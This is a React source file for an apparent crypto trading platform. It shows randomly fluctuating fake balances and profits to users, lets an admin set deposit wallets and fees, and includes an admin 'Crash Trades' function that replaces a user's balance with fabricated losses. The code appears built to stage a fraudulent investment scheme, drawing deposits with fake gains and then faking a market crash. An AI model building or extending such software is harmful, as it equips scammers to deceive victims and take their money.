import React, { useState, useEffect } from 'react';
import Sidebar from './components/Sidebar';
import Header from './components/Header';
import Dashboard from './components/Dashboard';
import Profile from './components/Profile';
import Wallet from './components/Wallet';
import History from './components/History';
import Footer from './components/Footer';
import Login from './components/Login';
import AdminPanel from './components/AdminPanel';
import ChatWidget from './components/ChatWidget';
import Signup from './components/Signup';
import { ChatSession, Message, StatData } from './types';
import { STATS_DATA } from './constants';

interface UserSession {
  email: string;
  role: 'user' | 'admin';
  name?: string;
}

export interface SystemSettings {
  serviceFee: number;
  btcWallet: string;
  usdtWallet: string;
  withdrawalFee: number;
  withdrawalFeeType: 'fixed' | 'percentage';
  depositFee: number;
  depositFeeType: 'fixed' | 'percentage';
}

type AuthView = 'login' | 'signup' | 'dashboard' | 'admin';

const App: React.FC = () => {
  const [authView, setAuthView] = useState<AuthView>('login');
  const [user, setUser] = useState<UserSession | null>(null);
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const [currentView, setCurrentView] = useState('Dashboard');
  const [userImage, setUserImage] = useState("https://picsum.photos/200/200");
  
  // Global User Financial State (Lifted Up)
  const [financials, setFinancials] = useState({
      balance: 250500.00,
      profit: 1000000.00,
      activeTrades: 60,
      totalWon: 40,
      totalLost: 20,
      isCrashed: false
  });

  // Global System Settings (Controlled by Admin)
  const [systemSettings, setSystemSettings] = useState<SystemSettings>({
    serviceFee: 1550.00,
    btcWallet: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
    usdtWallet: 'TX8D14Nj9j7xAB4dbGeiX9h8unkKHxuWwb',
    withdrawalFee: 5.00,
    withdrawalFeeType: 'fixed',
    depositFee: 0.00,
    depositFeeType: 'percentage'
  });

  // Global Chat State
  const [chatSessions, setChatSessions] = useState<ChatSession[]>([]);
  const [isChatOpen, setIsChatOpen] = useState(false);

  // Simulation Loop for Live Figures
  useEffect(() => {
    if (!user || user.role === 'admin' || financials.isCrashed) return;

    const interval = setInterval(() => {
       setFinancials(prev => {
          // Slight random fluctuation to simulate live market PnL
          const change = (Math.random() * 40) - 15; // Swing between -$15 and +$25
          return {
              ...prev,
              balance: prev.balance + change,
              profit: prev.profit + change
          };
       });
    }, 2000);

    return () => clearInterval(interval);
  }, [user, financials.isCrashed]);

  // Admin Action: Crash Trades
  const handleCrashTrades = () => {
      setFinancials({
          balance: 42.50, // Decimated balance
          profit: -15400.00, // Negative profit
          activeTrades: 0,
          totalWon: 30,
          totalLost: 45, // Massive jump in losses
          isCrashed: true
      });
  };

  const handleLogin = (role: 'user' | 'admin', email: string) => {
    // For demo purposes, we set a default name based on role/email
    const name = role === 'admin' ? 'Administrator' : 
                 email === 'alex.morgan@leadoptions.fx' ? 'Alex Morgan' : 
                 email.split('@')[0].split('.').map(word => 
                   word.charAt(0).toUpperCase() + word.slice(1)
                 ).join(' ');
    
    setUser({ role, email, name });
    setAuthView(role === 'admin' ? 'admin' : 'dashboard');
    setCurrentView('Dashboard');
  };

  const handleSignup = (email: string, name: string, role: 'user' | 'admin') => {
    setUser({ email, name, role });
    
    // Initialize financials for new user (different from existing demo user)
    if (role === 'user') {
      setFinancials({
        balance: 0.00, // Starting balance for new users
        profit: 0,
        activeTrades: 0,
        totalWon: 0,
        totalLost: 0,
        isCrashed: false,
      });
    }
    
    setAuthView(role === 'admin' ? 'admin' : 'dashboard');
    setCurrentView('Dashboard');
  };

  const handleLogout = () => {
    setUser(null);
    setAuthView('login');
    setCurrentView('Dashboard');
  };

  const handleSwitchToSignup = () => {
    setAuthView('signup');
  };

  const handleSwitchToLogin = () => {
    setAuthView('login');
  };

  // Chat Handlers
  const handleUserSendMessage = (text: string) => {
      if (!user) return;
      
      const newMessage: Message = {
          id: Date.now().toString(),
          sender: 'user',
          text,
          timestamp: new Date()
      };

      setChatSessions(prev => {
          const existingSessionIndex = prev.findIndex(s => s.userId === user.email);
          if (existingSessionIndex > -1) {
              const updatedSessions = [...prev];
              updatedSessions[existingSessionIndex] = {
                  ...updatedSessions[existingSessionIndex],
                  messages: [...updatedSessions[existingSessionIndex].messages, newMessage],
                  unreadAdmin: true
              };
              return updatedSessions;
          } else {
              return [...prev, {
                  userId: user.email,
                  userName: user.name || 'User',
                  messages: [newMessage],
                  unreadAdmin: true,
                  unreadUser: false
              }];
          }
      });
  };

  const handleAdminSendMessage = (userId: string, text: string) => {
      const newMessage: Message = {
          id: Date.now().toString(),
          sender: 'admin',
          text,
          timestamp: new Date()
      };

      setChatSessions(prev => {
           return prev.map(s => {
               if (s.userId === userId) {
                   return {
                       ...s,
                       messages: [...s.messages, newMessage],
                       unreadUser: true,
                       unreadAdmin: false // Admin replied, so they read it
                   };
               }
               return s;
           });
      });
  };

  // Mark messages as read when user opens chat
  const handleUserOpenChat = (open: boolean) => {
      setIsChatOpen(open);
      if (open && user) {
           setChatSessions(prev => prev.map(s => 
               s.userId === user.email ? { ...s, unreadUser: false } : s
           ));
      }
  };

  // Render different views based on auth state
  if (authView === 'login') {
    return <Login onLogin={handleLogin} onSwitchToSignup={handleSwitchToSignup} />;
  }

  if (authView === 'signup') {
    return <Signup onSignup={handleSignup} onSwitchToLogin={handleSwitchToLogin} />;
  }

  if (authView === 'admin') {
    return <AdminPanel 
        onLogout={handleLogout} 
        chatSessions={chatSessions}
        onAdminSendMessage={handleAdminSendMessage}
        systemSettings={systemSettings}
        onUpdateSettings={setSystemSettings}
        onCrashTrades={handleCrashTrades}
    />;
  }

  // Current User's Chat Session
  const currentUserSession = chatSessions.find(s => s.userId === user?.email);
  const userMessages = currentUserSession ? currentUserSession.messages : [];
  const hasUnreadMessages = currentUserSession ? currentUserSession.unreadUser : false;

  return (
    <div className="min-h-screen bg-background text-white font-sans selection:bg-accentOrange selection:text-white flex flex-col">
      <div className="flex flex-1 overflow-hidden">
        {/* Sidebar Navigation */}
        <Sidebar 
          isOpen={isSidebarOpen} 
          onClose={() => setIsSidebarOpen(false)} 
          currentView={currentView}
          onNavigate={(view) => {
            setCurrentView(view);
            setIsSidebarOpen(false);
          }}
          onLogout={handleLogout}
        />

        {/* Main Content Area */}
        <div className="flex-1 flex flex-col min-w-0 h-screen overflow-hidden relative">
          <Header 
            onMenuClick={() => setIsSidebarOpen(true)} 
            userImage={userImage} 
            balance={financials.balance}
          />
          
          <div className="flex-1 overflow-y-auto scroll-smooth">
            {currentView === 'Dashboard' && (
                <Dashboard 
                    financials={financials} 
                />
            )}
            {currentView === 'Profile' && (
              <Profile userImage={userImage} onUpdateImage={setUserImage} />
            )}
            {currentView === 'Wallet' && (
                <Wallet 
                    systemSettings={systemSettings} 
                    globalBalance={financials.balance}
                    setGlobalBalance={(val) => setFinancials(prev => ({...prev, balance: val}))}
                />
            )}
            {currentView === 'History' && <History />}
            
            <div className="pb-16 lg:pb-0"> {/* Padding for mobile sticky footer */}
                {/* Content spacer */}
            </div>
          </div>
          
           <Footer serviceFee={systemSettings.serviceFee} />

           {/* Customer Support Widget */}
           <ChatWidget 
              isOpen={isChatOpen}
              setIsOpen={handleUserOpenChat}
              messages={userMessages}
              onSendMessage={handleUserSendMessage}
              hasUnread={hasUnreadMessages}
           />
        </div>
      </div>
    </div>
  );
};

export default App;